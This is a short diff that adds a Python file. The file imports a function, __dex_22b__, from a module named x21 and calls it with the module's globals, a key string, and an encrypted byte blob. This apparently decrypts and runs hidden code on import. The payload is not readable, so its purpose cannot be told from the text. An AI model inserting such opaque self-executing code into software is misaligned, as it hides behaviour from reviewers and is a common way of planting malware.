@@ -1,0 +1,7 @@
+from x21 import __dex_22b__
+
+__dex_22b__(
+    globals(),
+    "tAKsoGRj73ZCO8Qi",
+    b't\x9aJ\xa8\x11\xf8|\xf8\xc7?\xefK<\x88P\xf5e\xeb\x8e\x85\xca\x88bV\t\xd8|\xc5\xb70\xd8.'
+)
